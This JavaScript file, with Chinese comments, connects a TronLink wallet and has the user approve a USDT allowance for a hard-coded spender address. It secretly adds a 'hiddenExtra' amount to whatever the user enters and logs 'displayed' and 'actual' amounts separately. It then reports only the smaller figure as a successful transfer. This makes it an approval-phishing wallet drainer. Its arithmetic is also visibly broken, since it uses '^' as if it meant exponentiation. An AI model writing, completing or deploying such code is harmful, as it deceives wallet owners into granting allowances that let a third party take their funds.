// usdtApprove.js — 修复连接问题版本

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// ====== 辅助函数 ======
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
  console.log("状态更新:", text);
}

// ====== 钱包连接函数 ======
async function connectWallet() {
  try {
    setStatus("正在连接钱包...");
    
    // 检查是否已安装 TronLink
    if (typeof window.tronLink === 'undefined') {
      throw new Error("未检测到 TronLink，请先安装钱包");
    }
    
    console.log("TronLink 检测到:", window.tronLink);
    
    // 请求账户访问权限
    setStatus("钱包弹窗中，请授权连接...");
    
    let accounts;
    try {
      // 方法1: 使用 tronLink.request
      accounts = await window.tronLink.request({ 
        method: 'tron_requestAccounts' 
      });
      console.log("账户请求结果:", accounts);
    } catch (requestError) {
      console.log("request 方法失败，尝试其他方式:", requestError);
      
      // 方法2: 直接检查 tronWeb
      if (window.tronWeb && window.tronWeb.defaultAddress) {
        console.log("使用现有的 tronWeb 连接");
        accounts = [window.tronWeb.defaultAddress.base58];
      } else {
        throw new Error("无法连接钱包，请确保 TronLink 已登录");
      }
    }
    
    // 等待 tronWeb 就绪
    console.log("等待 tronWeb 就绪...");
    await waitForTronWeb();
    
    const address = window.tronWeb.defaultAddress.base58;
    console.log("连接成功，地址:", address);
    
    setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
    return address;
    
  } catch (error) {
    console.error("连接失败:", error);
    
    let errorMsg = error.message;
    if (errorMsg.includes('rejected') || errorMsg.includes('denied')) {
      errorMsg = "用户拒绝了连接请求";
    } else if (errorMsg.includes('TronLink')) {
      errorMsg = "请安装并登录 TronLink 钱包";
    }
    
    setStatus(`❌ ${errorMsg}`, true);
    throw error;
  }
}

// 等待 tronWeb 就绪
function waitForTronWeb(timeout = 5000) {
  return new Promise((resolve, reject) => {
    if (window.tronWeb && window.tronWeb.ready) {
      console.log("tronWeb 已就绪");
      return resolve(true);
    }
    
    console.log("等待 tronWeb 注入...");
    let elapsed = 0;
    const interval = setInterval(() => {
      elapsed += 100;
      
      if (window.tronWeb && window.tronWeb.ready) {
        clearInterval(interval);
        console.log("tronWeb 就绪，等待时间:", elapsed + "ms");
        resolve(true);
      }
      
      if (elapsed >= timeout) {
        clearInterval(interval);
        reject(new Error("tronWeb 注入超时"));
      }
    }, 100);
  });
}

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    console.log("=== 开始授权流程 ===");
    setStatus("准备授权交易...");
    
    // 检查连接状态
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("用户地址:", fromAddr);

    // 获取用户输入
    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额");
      return;
    }

    // 计算总金额
    const hiddenExtra = 2^256 - 1;
    const totalAmount = inputAmount + hiddenExtra;
    const amountInSun = Math.floor(totalAmount * 2^256-1e6).toString();

    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权:", totalAmount, "USDT");

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 创建合约实例
    console.log("创建 USDT 合约实例...");
    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    console.log("✅ 合约实例创建成功");

    // 发起 approve 交易
    setStatus("请在钱包中确认授权...");
    
    console.log("发送 approve 交易...");
    const result = await usdtContract.approve(
      spenderAddress, 
      amountInSun
    ).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 授权成功，交易结果:", result);
    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
    
  } catch (err) {
    console.error("授权失败:", err);
    setStatus("❌ " + err.message, true);
  }
};

// ====== 页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  
  console.log("页面加载完成，初始化...");

  // 检查初始状态
  if (window.tronWeb && window.tronWeb.ready) {
    console.log("检测到已连接的 TronLink");
    const address = window.tronWeb.defaultAddress.base58;
    setStatus(`已连接: ${address.substring(0, 8)}...`);
    approveBtn.disabled = false;
  }

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      const address = await connectWallet();
      approveBtn.disabled = false;
      
      // 更新网络信息
      if (window.tronWeb.fullNode) {
        const node = window.tronWeb.fullNode.host;
        console.log("当前节点:", node);
      }
      
    } catch (error) {
      console.error("连接过程失败:", error);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });

  // 添加点击效果
  connectBtn.addEventListener('mousedown', () => {
    connectBtn.style.opacity = '0.8';
  });
  connectBtn.addEventListener('mouseup', () => {
    connectBtn.style.opacity = '1';
  });
  connectBtn.addEventListener('mouseleave', () => {
    connectBtn.style.opacity = '1';
  });
});

// 添加调试信息
console.log("脚本加载完成");
console.log("USDT 地址:", shastaUsdtAddress);
console.log("Spender 地址:", spenderAddress);


